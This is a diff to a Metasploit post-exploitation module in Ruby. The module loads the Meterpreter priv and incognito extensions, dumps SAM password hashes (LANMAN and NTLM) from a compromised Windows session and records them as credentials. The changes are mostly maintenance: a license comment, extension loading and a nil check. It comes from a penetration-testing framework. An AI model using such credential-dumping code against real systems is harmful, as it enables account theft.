@@ -5,8 +5,8 @@
 ##
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -43,8 +43,8 @@ class Metasploit3 < Msf::Post
 		end
 
 		# Make sure we're rockin Priv and Incognito
-		session.core.use("priv") if not session.respond_to?("priv")
-		session.core.use("incognito") if not session.respond_to?("incognito")
+		session.core.use("priv") if not session.priv
+		session.core.use("incognito") if not session.incognito
 
 		# It wasn't me mom! Stinko did it!
 		hashes = client.priv.sam_hashes
@@ -55,6 +55,7 @@ class Metasploit3 < Msf::Post
 
 		# Record hashes to the running db instance
 		print_good "Collecting hashes..."
+
 		hashes.each do |hash|
 			data = {}
 			data[:host]  = addr
@@ -63,7 +64,9 @@ class Metasploit3 < Msf::Post
 			data[:user]  = hash.user_name
 			data[:pass]  = hash.lanman + ":" + hash.ntlm
 			data[:type]  = "smb_hash"
-			data[:source_id] = session.db_record.id,
+			if not session.db_record.nil?
+				data[:source_id] = session.db_record.id
+			end
 			data[:source_type] = "exploit",
 			data[:active] = true
 
